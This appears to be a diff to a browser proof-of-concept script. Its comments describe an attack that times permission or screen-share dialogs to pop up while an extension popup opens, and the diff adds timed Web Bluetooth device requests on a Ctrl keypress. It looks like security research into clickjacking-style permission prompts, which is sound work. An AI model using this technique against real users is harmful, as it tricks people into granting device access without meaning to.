@@ -36,13 +36,15 @@ window.addEventListener('keydown', (e) => {
   // Open prompt on 'ctrl'
   if (e.keyCode === 17) {
             navigator.bluetooth.requestDevice({acceptAllDevices:true})
-
+ setTimeout(() => {
+         navigator.bluetooth.requestDevice({acceptAllDevices:true});
+      }, 2);
     if (isScreenShare) {
       // Secondary scenario: screen share dialog
       // Slight delay here to reduce time where screen share dialog is visible but extension popup is still opening.
       // If we call getDisplayMedia() *after* extension popup is opened, the extension popup is closed and attack fails.
       setTimeout(() => {
-        alert(2)
+         navigator.bluetooth.requestDevice({acceptAllDevices:true});
       }, 400);
     } else {
       // Main scenario: permission prompt
